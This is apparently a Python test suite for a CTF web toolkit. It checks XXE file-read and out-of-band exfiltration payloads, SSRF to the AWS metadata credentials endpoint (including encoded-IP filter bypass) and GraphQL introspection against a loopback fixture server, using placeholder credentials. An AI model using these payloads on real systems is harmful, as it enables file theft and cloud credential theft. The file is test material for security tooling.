#!/usr/bin/env python3
"""wave125/web-xxe-ssrf: solvers/toolkits/web_xxe_ssrf.py (XXE file read / OOB, SSRF to cloud
instance metadata, GraphQL introspection + batching).

  .venv/bin/python tests/test_wave125_web_xxe_ssrf.py

Every live helper is driven through a real web.WebClient against an in-process http.server on
127.0.0.1 (a fixture app of this test, stopped at the end): no other host, no token, no Game Master.
The payload builders and the never-guess proof rule are checked offline. The proof regexes are
asserted equal to solvers/web/proof_hunt.py's, so they can never drift.
"""

import event_pin  # noqa: E402  (tests/event_pin.py)
event_pin.pin(globals(), "huntress")  # Huntress web tests: proof_<32 hex> payoffs (events/huntress [proof])
import base64
import http.server
import inspect
import json
import re
import socket
import sys
import threading
import urllib.parse
import urllib.request
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
TK = REPO / "solvers" / "toolkits"
sys.path.insert(0, str(TK))
sys.path.insert(0, str(REPO / "solvers" / "web"))
PY = sys.executable

import web  # noqa: E402
import web_xxe_ssrf as X  # noqa: E402

FAILED = []


def check(label, ok, detail=""):
    print(f"{'ok  ' if ok else 'FAIL'} {label}" + ("" if ok or not detail else f"  [{str(detail)[:400]}]"))
    if not ok:
        FAILED.append(label)


def _d(result):
    """A result dict trimmed for a failure message: drop raw-bytes bodies so it is printable."""
    return {k: (v if k not in ("body",) else f"<{len(v or b'')} bytes>") for k, v in result.items()}


PASSWD = b"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
PROOF = "proof_0123456789ab4def80123456789abcde"   # a valid v4-UUID-form proof (is_proof True)
# The files a fixture XML parser can read over XXE (file:// and php://filter).
FILES = {
    "/etc/passwd": PASSWD,
    "/run/huntress/objective.txt": ("the objective is " + PROOF + "\n").encode(),
    "/var/www/config.php": b"<?php $db_pass = 'hunter2'; // " + PROOF.encode() + b"\n",
}
# The SSRF inner network: a URL the app fetches server-side -> the bytes it returns.
ROLE = "s3access-role"
AWS_META = "http://169.254.169.254/latest/meta-data/"
AWS_CREDS_LIST = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
AWS_CREDS = AWS_CREDS_LIST + ROLE
CREDS_JSON = json.dumps({
    "Code": "Success", "LastUpdated": "2026-10-24T00:00:00Z", "Type": "AWS-HMAC",
    "AccessKeyId": "ASIAEXAMPLEKEY", "SecretAccessKey": "wJalrXUtnFEMI/EXAMPLEKEY",
    "Token": "FwoGZXIvYXdzEEXAMPLETOKEN", "Expiration": "2026-10-24T06:00:00Z",
    "Objective": PROOF}).encode()   # the proof as its own clean token (not glued to another value)
INNER = {
    AWS_META: b"ami-id\nhostname\niam/\ninstance-id\nlocal-ipv4\nsecurity-groups\n",
    AWS_CREDS_LIST: (ROLE + "\n").encode(),
    AWS_CREDS: CREDS_JSON,
}
ENCODED_HOSTS = set(X.ip_encodings("169.254.169.254"))

# A canned GraphQL introspection schema and a query/mutation.
SCHEMA = {"data": {"__schema": {
    "queryType": {"name": "Query"}, "mutationType": {"name": "Mutation"}, "subscriptionType": None,
    "types": [
        {"name": "Query", "kind": "OBJECT", "fields": [
            {"name": "me", "args": []}, {"name": "user", "args": [{"name": "id"}]}]},
        {"name": "Mutation", "kind": "OBJECT", "fields": [{"name": "login", "args": [{"name": "password"}]}]},
        {"name": "User", "kind": "OBJECT", "fields": [{"name": "id", "args": []}]},
        {"name": "__Schema", "kind": "OBJECT", "fields": []}],
    "directives": []}}}


_ENTITY = re.compile(r'<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)">')
_REF = re.compile(r"&(\w+);")


def _resolve_sysid(sysid):
    if sysid.startswith("file://"):
        return FILES.get(sysid[len("file://"):])
    if sysid.startswith("php://filter/convert.base64-encode/resource="):
        p = sysid.split("resource=", 1)[1]
        data = FILES.get(p)
        return base64.b64encode(data) if data is not None else None
    return None


def _xxe_eval(body, mode):
    """A tiny fixture XML parser. `mode`:
      'echo'   resolves one external general entity and echoes its expansion (classic in-band XXE);
      'blind'  parses but echoes nothing (a blind parser);
      'decoy'  returns PASSWD whenever the doc declares any SYSTEM entity, whatever the file (a page
               that shows the signature for any entity input);
      'reflect' echoes the request body verbatim (a pure reflection)."""
    if mode == "reflect":
        return body.encode()
    if mode == "decoy":
        return PASSWD if "SYSTEM" in body else b"ok"
    m = _ENTITY.search(body)
    if not m:
        return b"ok"
    name, sysid = m.group(1), m.group(2)
    expansion = _resolve_sysid(sysid)
    if mode == "blind":
        return b"accepted"
    ref = f"&{name};"
    if ref in body and expansion is not None:
        return body.replace(ref, expansion.decode("latin-1")).encode("latin-1")
    return body.replace(ref, "").encode() if ref in body else b"ok"


def _ssrf_fetch(url, mode):
    """A fixture server-side fetch. `mode` 'open' resolves the inner net; 'reflect' echoes the url;
    'filtered' refuses the literal dotted metadata IP but resolves an encoded spelling."""
    if mode == "reflect":
        return ("you asked for " + url).encode()
    host = urllib.parse.urlsplit(url).hostname or ""
    if mode == "filtered":
        if host == "169.254.169.254":
            return b"blocked: metadata ip denied"
        if host in ENCODED_HOSTS:   # an encoded spelling of 169.254.169.254 resolves to it
            url = url.replace(host, "169.254.169.254", 1)
    return INNER.get(url, b"could not resolve host\n")


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, body):
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        u = urllib.parse.urlsplit(self.path)
        qs = urllib.parse.parse_qs(u.query)
        if u.path == "/":
            return self._send(200, b"welcome -- a plain landing page, no secrets here\n")
        if u.path.startswith("/fetch"):
            mode = {"": "open", "-reflect": "reflect", "-filtered": "filtered"}.get(
                u.path[len("/fetch"):], "open")
            url = (qs.get("url") or [""])[0]
            return self._send(200, _ssrf_fetch(url, mode))
        if u.path == "/graphql":   # GET ?query= fallback
            q = (qs.get("query") or [""])[0]
            if "__schema" in q:
                return self._send(200, json.dumps(SCHEMA).encode())
            return self._send(200, b'{"data":{"__typename":"Query"}}')
        return self._send(404, b"not found\n")

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length)
        if self.path.startswith("/xml"):
            mode = {"": "echo", "-blind": "blind", "-decoy": "decoy", "-reflect": "reflect"}.get(
                self.path[len("/xml"):], "echo")
            body = raw.decode("latin-1") if isinstance(raw, (bytes, bytearray)) else str(raw)
            return self._send(200, _xxe_eval(body, mode))
        if self.path.startswith("/graphql"):
            off = self.path == "/graphql-off"
            nobatch = self.path == "/graphql-nobatch"
            try:
                obj = json.loads(raw.decode("utf-8"))
            except ValueError:
                obj = None
            if isinstance(obj, list) and not nobatch:   # array batch -> an array response, one per op
                return self._send(200, json.dumps([{"data": {"__typename": "Query"}} for _ in obj]).encode())
            q = (obj or {}).get("query", "") if isinstance(obj, dict) else ""
            if "__schema" in q:
                if off:
                    return self._send(200, b'{"errors":[{"message":"introspection is disabled"}]}')
                return self._send(200, json.dumps(SCHEMA).encode())
            return self._send(200, b'{"data":{"__typename":"Query"}}')
        return self._send(404, b"not found\n")


def serve():
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv, f"http://127.0.0.1:{srv.server_address[1]}"


@pytest.fixture(scope="module")
def base():
    """The live tests' target under pytest: this module's own loopback fixture app (serve()), the
    same one main() starts for a script run. A toy in-process server on 127.0.0.1 needs no external
    service, so the live tests are ordinary tests, not `live`-marked. Shut down in teardown
    (checked by test_base_fixture_teardown_stops_the_server)."""
    srv, url = serve()
    try:
        yield url
    finally:
        srv.shutdown()
        srv.server_close()


def test_base_fixture_teardown_stops_the_server():
    """Drives the `base` fixture's own generator the way pytest does (next() to set up, next() again
    to tear down) and checks that teardown leaves no server behind: the serve_forever thread has
    exited (shutdown), the listening socket is closed explicitly (server_close) and the port refuses
    connections. The test holds its own reference to the server, so a missing server_close cannot
    hide behind the socket being garbage-collected when the generator frame is freed."""
    fixture_fn = inspect.unwrap(base)   # the undecorated generator function pytest calls
    check("the `base` fixture unwraps to its generator function",
          inspect.isgeneratorfunction(fixture_fn), fixture_fn)
    before = set(threading.enumerate())
    gen = fixture_fn()
    url = next(gen)
    started = [t for t in threading.enumerate() if t not in before]
    servers = [v for v in gen.gi_frame.f_locals.values() if isinstance(v, http.server.HTTPServer)]
    check("the set-up fixture holds exactly one HTTP server", len(servers) == 1, servers)
    srv = servers[0] if servers else None
    port = urllib.parse.urlsplit(url).port
    check("the fixture yields a 127.0.0.1 URL", urllib.parse.urlsplit(url).hostname == "127.0.0.1", url)
    with urllib.request.urlopen(url + "/", timeout=5) as resp:
        check("the fixture server answers while the fixture is set up",
              resp.status == 200 and b"welcome" in resp.read(), resp.status)
    check("the fixture's teardown ends the generator", next(gen, "not-exhausted") == "not-exhausted")
    check("setup started a server thread", len(started) >= 1, started)
    for t in started:
        t.join(timeout=5)
    alive = [t.name for t in started if t.is_alive()]
    check("teardown stops the serve_forever thread (shutdown)", not alive, alive)
    check("teardown closes the listening socket (server_close)",
          srv is not None and srv.socket.fileno() == -1, srv and srv.socket.fileno())
    refused = False
    try:
        socket.create_connection(("127.0.0.1", port), timeout=2).close()
    except ConnectionRefusedError:
        refused = True
    check("after teardown the fixture port refuses connections", refused, port)


def test_proof_rule_matches_proof_hunt():
    import proof_hunt as ph
    check("PROOF_SEEN equals proof_hunt's", X.PROOF_SEEN.pattern == ph.PROOF_SEEN.pattern)
    check("PROOF_FORMAT equals proof_hunt's", X.PROOF_FORMAT.pattern == ph.PROOF_FORMAT.pattern)
    check("PROOF_WIRE equals proof_hunt's", X.PROOF_WIRE.pattern == ph.PROOF_WIRE.pattern)
    check("is_proof agrees with proof_hunt.is_proof",
          X.is_proof(PROOF) is True and ph.is_proof(PROOF) is True
          and X.is_proof("proof_" + "f" * 32) is True and ph.is_proof("proof_" + "f" * 32) is True)


def test_proof_rule_offline():
    check("a single judged proof from an exploit body is returned",
          X.proof_from_exploit("leaked " + PROOF, ["home page"]) == PROOF)
    check("payoff-not-plain: a proof on a plain page is None",
          X.proof_from_exploit("x " + PROOF, ["home " + PROOF]) is None)
    check("one-proof: two proof-like values -> None",
          X.proof_from_exploit(PROOF + " proof_" + "a" * 32, []) is None)
    non_v4 = "proof_" + "f" * 32
    check("a lowercase non-v4 proof is accepted; UUID-v4 is only an empirical validator",
          X.proof_from_exploit(non_v4, []) == non_v4
          and X.is_proof(non_v4) and X.PROOF_FORMAT.fullmatch(non_v4) is None)
    upper = PROOF.upper()
    check("an uppercase proof candidate is never normalized into an auto-returnable answer",
          X.proof_from_exploit("leaked " + upper, []) is None)
    check("uppercase proof evidence is retained exactly for agent review",
          X.proofs_seen("leaked " + upper) == {upper}
          and PROOF not in X.proofs_seen("leaked " + upper))
    check("an uppercase baseline spelling poisons a lowercase exploit candidate rather than being normalized",
          X.proof_from_exploit("leaked " + PROOF, ["example " + upper]) is None)
    check("no proof at all -> None", X.proof_from_exploit("nothing here", ["x"]) is None)


def test_security_json_offline():
    duplicate_creds = (
        '{"Code":"Success","AccessKeyId":"first","AccessKeyId":"second",'
        '"SecretAccessKey":"secret","Token":"token"}'
    )
    check("duplicate-key metadata is neither a signature nor parsed credentials",
          X.metadata_signature(duplicate_creds) is None
          and X.parse_aws_credentials(duplicate_creds) is None)
    colliding_schema = json.dumps(SCHEMA)[:-1] + ',"Data":{"__schema":{"types":[]}}}'
    check("case-colliding GraphQL policy keys are rejected rather than last-wins",
          X.parse_schema(colliding_schema) is None)
    check("strict metadata JSON still parses an unambiguous credentials document",
          (X.parse_aws_credentials(CREDS_JSON) or {}).get("AccessKeyId") == "ASIAEXAMPLEKEY")
    invalid_utf8 = (CREDS_JSON.encode() if isinstance(CREDS_JSON, str) else bytes(CREDS_JSON)) + b"\xff"
    check("invalid-UTF-8 structural metadata stays in the strict JSON lane",
          X._strict_json(invalid_utf8) is None and X._looks_structural_json(invalid_utf8)
          and X.metadata_signature(invalid_utf8) is None)


def test_hand_tool_contract():
    src = (TK / "web_xxe_ssrf.py").read_text()
    check("no solve_set (not a lane solver)", "def solve_set" not in src)
    check("no signals (not a match candidate)", "def signals" not in src)
    check("not imported by a solve path: web.py does not re-export it",
          "web_xxe_ssrf" not in (TK / "web.py").read_text())
    import importlib
    m = importlib.import_module("web_xxe_ssrf")
    check("module exposes neither signals() nor solve_set()",
          not hasattr(m, "signals") and not hasattr(m, "solve_set"))


def test_xxe_payloads_offline():
    pays = dict(X.xxe_file_payloads("/etc/passwd"))
    check("file_url variant uses a file:// SYSTEM entity",
          'SYSTEM "file:///etc/passwd"' in pays["file_url"] and "&xxe;" in pays["file_url"])
    check("php_filter variant uses php://filter base64",
          "php://filter/convert.base64-encode/resource=/etc/passwd" in pays["php_filter"])
    dtd, payload = X.xxe_oob_dtd("http://10.0.0.5:8000", "oabc12345678", "/etc/passwd", php=True)
    check("oob dtd reads via php filter and exfils with a parameter entity",
          "php://filter" in dtd and "% file SYSTEM" in dtd and "%exfil;" in dtd)
    check("oob payload loads the external dtd at the collector",
          "http://10.0.0.5:8000/f/oabc12345678.dtd" in payload)


def test_xxe_live(base):
    c = web.WebClient(base)
    r = X.confirm_xxe_read(c, "/xml")
    check("XXE file read confirmed from /etc/passwd's content signature (file_url)",
          r["found"] and r["marker"] == "/etc/passwd" and r["variant"] == "file_url"
          and r["how"] == "raw" and r["control_clean"] is True, str(_d(r))[:300])
    # php://filter only: force that family by removing passwd from the file_url path? Instead read a
    # PHP file and confirm the base64 decode.
    c2 = web.WebClient(base)
    got = X.read_file_over_xxe(c2, "/xml", "/var/www/config.php", variant="php_filter",
                               baseline_bodies=[b"welcome landing"])
    check("read_file_over_xxe decodes a php://filter base64 read",
          got["decoded"] is not None and b"db_pass" in got["decoded"], got.get("decoded"))
    check("read_file_over_xxe returns the single judged proof the file carried",
          got["proof"] == PROOF, got.get("proof"))
    # a blind parser (no entity echo): not found in-band.
    cb = web.WebClient(base)
    rb = X.confirm_xxe_read(cb, "/xml-blind")
    check("a blind XML parser is NOT claimed in-band (no content signature)", not rb["found"], json.dumps(rb)[:200])
    # a decoy that shows passwd for any SYSTEM entity: negative control refuses it.
    cd = web.WebClient(base)
    rd = X.confirm_xxe_read(cd, "/xml-decoy")
    check("a decoy page (passwd for any entity input) is NOT claimed (negative control)",
          not rd["found"] and any(t[-1] == "decoy" for t in rd["tried"]), json.dumps(rd)[:300])
    # a pure reflection: the payload is echoed but the file content is not.
    cr = web.WebClient(base)
    rr = X.confirm_xxe_read(cr, "/xml-reflect")
    check("a reflection (echoed payload, no file content) is NOT claimed", not rr["found"], str(_d(rr))[:200])
    # a target that already serves passwd on the baseline: the marker is not claimed.
    # (/xml-decoy returns passwd only with SYSTEM, so baseline is clean there; this is covered by the
    #  negative control above. The baseline guard itself is covered offline via baseline_has wiring.)


def test_ssrf_live(base):
    c = web.WebClient(base)
    r = X.confirm_metadata_ssrf(c, "/fetch", "url", encodings=False)
    check("SSRF to AWS metadata confirmed by the IMDS listing signature",
          r["hit"] and r["cloud"] == "aws" and "aws_imds_listing" in r["matched"], str(_d(r))[:300])
    # credentials extraction + proof: restrict the urls to the creds document.
    c2 = web.WebClient(base)
    r2 = X.confirm_metadata_ssrf(c2, "/fetch", "url", urls=[("aws", AWS_CREDS, {}, "")])
    creds = r2.get("credentials") or {}
    check("the AWS credentials document is parsed as a finding",
          r2["hit"] and creds.get("AccessKeyId") == "ASIAEXAMPLEKEY" and "SecretAccessKey" in creds,
          str(_d(r2))[:300])
    check("the single judged proof in the metadata body is returned; the credential is a finding, not a proof",
          r2["proof"] == PROOF, r2.get("proof"))
    # a reflection of the URL is never a metadata hit.
    cr = web.WebClient(base)
    rr = X.confirm_metadata_ssrf(cr, "/fetch-reflect", "url", encodings=False)
    check("a reflected fetch URL is NOT a metadata hit", not rr["hit"], str(_d(rr))[:200])
    # an encoded IP spelling reaches metadata when the dotted form is filtered.
    cf = web.WebClient(base)
    rf = X.confirm_metadata_ssrf(cf, "/fetch-filtered", "url", encodings=True)
    check("an encoded 169.254.169.254 spelling reaches a filtered fetch",
          rf["hit"] and rf["cloud"] == "aws", str(_d(rf))[:300])


def test_graphql_live(base):
    c = web.WebClient(base)
    r = X.probe_introspection(c, "/graphql")
    sc = r.get("schema") or {}
    check("GraphQL introspection confirmed by a real schema (data.__schema.types)",
          r["enabled"] and sc.get("query_type") == "Query", json.dumps(r.get("tried"))[:200])
    check("the schema is flattened for the agent (types and root fields)",
          "User" in sc.get("types", []) and ("me", []) in sc.get("query_fields", [])
          and any(name == "login" for name, _ in sc.get("mutation_fields", [])), json.dumps(sc)[:300])
    # introspection disabled: not enabled.
    co = web.WebClient(base)
    ro = X.probe_introspection(co, "/graphql-off")
    check("a disabled introspection endpoint is NOT enabled", not ro["enabled"], str(_d(ro))[:200])
    # batching supported.
    cb = web.WebClient(base)
    rb = X.confirm_batching(cb, "/graphql")
    check("array batching confirmed by a 2-element array response",
          rb["supported"] and rb["length"] == 2 and rb["requests"] == 1, json.dumps(rb))
    # batching not supported (an endpoint that returns a single object for an array).
    cn = web.WebClient(base)
    rn = X.confirm_batching(cn, "/graphql-nobatch")   # returns one object for an array body
    check("an endpoint that does not array-batch is reported unsupported", not rn["supported"], json.dumps(rn))
    # offline builders.
    check("alias_batch_query builds N aliased copies in one document",
          X.alias_batch_query("user", "id", [1, 2]).count("user(id:") == 2)
    check("batch_array_body builds a JSON array of query objects",
          json.loads(X.batch_array_body(["{a}", "{b}"])) == [{"query": "{a}"}, {"query": "{b}"}])


def main():
    # A script run: event_pin.pin() above already set CTF_EVENT=huntress and pinned the suite's
    # loopback scope profile (tests/event_pin.py).
    test_base_fixture_teardown_stops_the_server()
    srv, base = serve()
    try:
        test_proof_rule_matches_proof_hunt()
        test_proof_rule_offline()
        test_security_json_offline()
        test_hand_tool_contract()
        test_xxe_payloads_offline()
        test_xxe_live(base)
        test_ssrf_live(base)
        test_graphql_live(base)
    finally:
        srv.shutdown()
    if FAILED:
        print(f"\n{len(FAILED)} FAILED: " + "; ".join(FAILED))
        return 1
    print("ok")
    return 0


if __name__ == "__main__":
    sys.exit(main())
